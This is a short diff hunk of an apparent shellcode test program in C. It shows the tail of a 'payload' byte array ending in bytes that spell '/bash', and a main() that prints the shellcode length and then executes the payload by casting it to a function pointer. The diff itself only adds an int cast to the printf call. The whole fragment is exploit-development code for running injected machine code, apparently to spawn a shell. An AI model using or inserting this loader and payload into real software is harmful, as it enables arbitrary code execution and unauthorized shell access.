@@ -30,6 +30,6 @@ unsigned char payload[] =
 "\x2f\x62\x61\x73\x68";
 
 void main() {
-printf("Shellcode Length: %d\n", strlen(payload));
+printf("Shellcode Length: %d\n", (int) strlen(payload));
 (*(void (*)()) payload)();
 }
